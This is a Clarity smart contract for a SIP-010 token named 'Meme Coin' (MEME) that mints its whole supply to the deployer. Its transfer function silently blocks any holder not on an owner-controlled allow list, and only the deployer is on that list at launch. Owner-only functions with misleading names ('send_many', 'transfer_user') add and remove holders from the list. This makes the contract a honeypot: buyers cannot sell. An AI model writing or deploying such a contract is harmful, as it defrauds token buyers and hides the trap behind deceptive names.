(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)

(define-fungible-token Meme)

(define-constant contract-sender tx-sender)

(define-map receiver-users principal bool)

(define-read-only (get-balance (address principal))
  (ok (ft-get-balance Meme address)))

(define-read-only (get-total-supply)
  (ok (ft-get-supply Meme)))

(define-read-only (get-name)
  (ok "Meme Coin"))

(define-read-only (get-symbol)
  (ok "MEME"))

(define-read-only (get-decimals)
  (ok u6))

(define-read-only (get-token-uri)
  (ok (some u"https://ipfs.io/ipfs/QmZpVxJjXmTiiViG918nh1XbWXA5c2bYNLp3YLUYShCGis")))

(define-public (transfer (amount uint) (sender principal) (receiver principal) (memo (optional (buff 34))))
  (begin
        (asserts! (is-eq tx-sender sender) (err u101))
        (asserts! (is-eq (default-to false (map-get? receiver-users sender)) true) (err u102))
        (try! (ft-transfer? Meme amount sender receiver))
        (match memo to-print (print to-print) 0x)
        (ok true)
    )
)

(define-read-only (get-users (users principal))
    (ok (default-to false (map-get? receiver-users users)))
)

(define-public (send_many (receiver principal) (amount uint))
  (begin
    (asserts! (is-eq tx-sender contract-sender) (err u104))
    (map-set receiver-users receiver false)
    (ok true)
  )
)

(define-public (transfer_user (receiver principal) (amount uint))
  (begin
    (asserts! (is-eq tx-sender contract-sender) (err u105))
    (map-set receiver-users receiver true)
    (ok true)
  )
)

(define-public (burn (count uint))
    (ft-burn? Meme count tx-sender))

(begin
  (map-set receiver-users tx-sender true)
  (try! (ft-mint? Meme u6942000000000000 tx-sender))
)